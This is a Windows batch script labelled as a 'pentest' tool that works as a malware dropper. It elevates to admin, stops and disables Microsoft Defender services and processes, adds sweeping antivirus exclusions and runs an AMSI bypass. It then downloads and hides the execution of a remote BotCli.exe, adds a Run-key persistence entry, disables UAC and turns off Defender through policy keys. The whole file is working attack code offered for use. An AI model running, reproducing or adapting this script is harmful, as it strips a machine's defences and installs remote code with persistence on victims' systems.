@echo off
color a
setlocal enabledelayedexpansion

:: Request admin elevation
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo [+] Advanced Pentest Mode - Full Defender Bypass Initiated...
timeout /t 2 /nobreak >nul

:: ==================== COMPLETE DEFENDER DISABLE ====================
echo [+] Stage 1: Full Defender Service Termination...
sc config WinDefend start= disabled >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1
sc config Sense start= disabled >nul 2>&1
sc config WdNisDrv start= disabled >nul 2>&1
sc config WdBoot start= disabled >nul 2>&1
sc stop WinDefend >nul 2>&1
sc stop WdNisSvc >nul 2>&1
sc stop Sense >nul 2>&1
timeout /t 3 /nobreak >nul

:: Kill remaining processes
taskkill /f /im MsMpEng.exe >nul 2>&1
taskkill /f /im MsSense.exe >nul 2>&1
taskkill /f /im SecurityHealthService.exe >nul 2>&1

echo [+] Stage 2: Comprehensive Exclusion Configuration...
:: Add ALL AppData paths + system paths to exclusions
powershell -ep bypass -c "
$paths = @(
    '$env:LOCALAPPDATA',
    '$env:APPDATA', 
    '$env:TEMP',
    '$env:TMP',
    'C:\Windows\Temp',
    'C:\Temp',
    '%~dp0'
)
foreach ($path in $paths) { Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue }
Add-MpPreference -ExclusionExtension '.exe','.bat','.ps1','.dll','.scr' -ErrorAction SilentlyContinue
Add-MpPreference -DisableRealtimeMonitoring `$true -ErrorAction SilentlyContinue
Add-MpPreference -DisableBehaviorMonitoring `$true -ErrorAction SilentlyContinue
Add-MpPreference -DisableIOAVProtection `$true -ErrorAction SilentlyContinue
Add-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
Add-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
Add-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue
"

:: ==================== AMSI BYPASS ====================
echo [+] Stage 3: AMSI + PowerShell Bypass...
powershell -ep bypass -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

:: ==================== DOWNLOAD & EXECUTE ====================
set "PAYLOAD_DIR=%LOCALAPPDATA%\pentest"
set "PAYLOAD=%PAYLOAD_DIR%\BotCli.exe"

if not exist "%PAYLOAD_DIR%" mkdir "%PAYLOAD_DIR%"

echo [+] Stage 4: Downloading Advanced Pentest Tool...
powershell -ep bypass -c "Invoke-WebRequest -Uri 'https://github.com/devoxry777-crypto/1234/raw/refs/heads/main/BotCli.exe' -OutFile '%PAYLOAD%' -UseBasicParsing"

:: Verify download
if exist "%PAYLOAD%" (
    echo [+] Payload verified. Launching as SYSTEM...
    
    :: Run as SYSTEM via PsExec technique (embedded)
    powershell -ep bypass -c "
    \$proc = Start-Process -FilePath '%PAYLOAD%' -Verb RunAs -WindowStyle Hidden -PassThru
    \$proc.WaitForExit()
    "
    
    :: Persist via registry (optional stealth)
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v PentestTool /t REG_SZ /d "%PAYLOAD%" /f >nul 2>&1
    
) else (
    echo [!] Download failed - manual intervention required
)

:: ==================== FINALIZATION ====================
echo [+] Stage 5: Persistence & Cleanup...
:: Disable UAC prompts (pentest mode)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1

:: Block Defender updates
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1
cls
exit
